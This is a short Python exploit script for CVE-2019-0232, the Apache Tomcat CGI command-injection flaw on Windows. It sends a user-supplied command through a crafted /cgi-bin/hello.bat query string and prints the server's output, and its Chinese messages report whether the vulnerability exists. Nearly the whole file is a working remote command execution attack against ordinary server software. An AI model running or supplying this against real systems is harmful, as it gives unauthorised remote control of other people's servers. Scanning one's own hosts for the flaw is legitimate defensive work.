#!/usr/bin/env python

import requests
import time
import sys

# url = 'http://172.30.230.102:8080/'
url = sys.argv[1]
payload = '/cgi-bin/hello.bat?&C%3A%5CWindows%5CSystem32%5C'
cmd = sys.argv[2]


def cve_2019_0232(url):
    payload_url = url + payload
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0'
    }


    response = requests.get(url=payload_url+cmd, headers=headers)
    if response.status_code == 200:
        print('漏洞存在！')
        print(response.content.decode('gbk')) #Windows服务器一般用gbk编码
    else:
        print('漏洞不存在！')

cve_2019_0232(url)


